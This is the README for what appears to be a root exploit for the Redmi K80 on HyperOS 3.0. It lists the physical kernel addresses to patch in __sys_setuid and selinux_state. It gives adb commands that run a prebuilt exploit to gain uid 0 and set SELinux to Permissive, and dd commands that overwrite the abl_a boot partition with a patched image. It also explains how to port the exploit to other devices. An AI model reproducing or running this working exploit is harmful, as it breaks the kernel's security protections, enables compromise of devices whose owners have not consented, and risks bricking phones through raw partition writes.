# K80 Root

**设备**：Redmi K80 (zorn) | SoC: SM8650 Snapdragon 8 Gen 3  
**系统**：HyperOS 3.0 (测试过 `3.0.302` / `3.0.303`，`3.0.9` 不支持)  
**⚠ 仅支持 K80 上述版本。其他机型需重新找地址。**

PA = 物理地址（Physical Address）

---

## 原理

```
Qualcomm GPU SMMU bypass (Project Zero cheese-cake 框架)
        │
        ▼
   任意物理内存读写
        │
        ├──► __sys_setuid 补丁 → setuid(0) 成功 → Root
        │
        └──► selinux_state 写 0 → SELinux Permissive
```

| 补丁 | 地址 | 操作 |
|------|------|------|
| `__sys_setuid` | `0xA80DBCFC` (.text) | `BL ns_capable_setid` → `MOV w0,#1; NOP` |
| `selinux_state` | `0xAA3290B0` (BSS) | byte0 写 0（D-cache 可能需两次） |

## 文件

```
├── LICENSE
├── README.md
├── bin/
│   ├── exploit        # 主程序（K80 预编译）
│   └── su             # setuid(0) 提权
├── src/
│   ├── exploit.c      # 主程序源码
│   ├── su.c           # 提权辅助
│   ├── adrenaline.h   # GPU exploit 接口
│   └── kallsyms_lookup.c  # 内核符号运行时解析
├── tools/
│   ├── README.md      # 工具说明
│   ├── analysis/      # 实际找地址的脚本
│   ├── kallsyms/      # 自动解析器（不稳定）
│   └── firmware/      # 固件解析
```

## 操作

### 获取 Root

```bash
adb push bin/exploit /data/local/tmp/exploit
adb push bin/su /data/local/tmp/su
adb shell chmod 755 /data/local/tmp/exploit /data/local/tmp/su

adb shell /data/local/tmp/exploit
adb shell "/data/local/tmp/su -c 'id'"
# → uid=0(root)
```

setuid 补丁绕过 `ns_capable_setid`，一次 exploit 即拿 root。

### 获取 SELinux Permissive（有随机性，可能需多次）

```bash
adb shell /data/local/tmp/exploit; sleep 30
adb shell /data/local/tmp/su -c getenforce
# → Permissive
```

### 解锁 Bootloader（参考流程）

```bash
# 备份原版 ABL
adb push abl_patched.elf /data/local/tmp/abl_patched.elf
adb shell "echo 'dd if=/dev/block/by-name/abl_a of=/data/local/tmp/abl_a_orig.img bs=4096' > /data/local/tmp/bak.sh"
adb shell "chmod 755 /data/local/tmp/bak.sh; /data/local/tmp/su -c /data/local/tmp/bak.sh"
adb pull /data/local/tmp/abl_a_orig.img
# 刷入修改版 ABL
adb shell "echo 'dd if=/data/local/tmp/abl_patched.elf of=/dev/block/by-name/abl_a bs=4096 conv=notrunc' > /data/local/tmp/flash.sh"
adb shell "chmod 755 /data/local/tmp/flash.sh; /data/local/tmp/su -c /data/local/tmp/flash.sh"
# 重启到 fastboot
adb reboot bootloader
fastboot boot Unlocking-SM8650.img
```

> `su -c` 对带参数命令（如 `dd`）引号解析有问题，用脚本文件执行。`conv=notrunc` 防止截断分区。先备份再刷。

### 自行编译

需要 Android NDK r26+。clang 路径按平台：

- Windows：`%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd`
- Linux：`$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang`

```bash
$clang -fPIE -pie -o bin/exploit src/exploit.c -ldl
$clang -fPIE -pie -o bin/su src/su.c
```

更换 PA：修改 `src/exploit.c` 顶部的 `#define`，重新编译。

## 关键物理地址（K80）

| 变量 | 地址 | 说明 |
|------|------|------|
| `selinux_state` | `0xAA3290B0` | BSS，byte0=0 → Permissive |
| `__sys_setuid` | `0xA80DBCFC` | 函数入口 |
| `__sys_setuid+0x40` | `0xA80DBD3C` | `BL ns_capable_setid`，替换点 |

## 适配其他机型

1. 提取 kernel Image（`unpack_bootimg boot.img` 或 `magiskboot unpack boot.img`）
2. 手动定位 kallsyms 四大段（`tools/analysis/` 脚本 + 010 Editor）  
3. 硬编码偏移到 `kallsyms_decompress.py`，运行找到目标符号索引
4. `PA = kallsyms_offsets[索引] + PHYS_BASE`（SM8650 为 `0xA8000000`）
5. 替换 `exploit.c` 顶部的 `#define`，重新编译

> 自动解析器 `kallsyms_parser.py` 在 Qualcomm 魔改内核上大概率失败。**已 root 的设备**可以直接用 `/proc/kallsyms` 行号取索引，跳过第 2-3 步。

## 故障排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `su -c` 报 "Operation not permitted" | 重启后补丁丢失 | 重新运行 exploit |
| `getenforce` 仍为 Enforcing | D-cache 未淘汰 | 再跑一次 exploit |
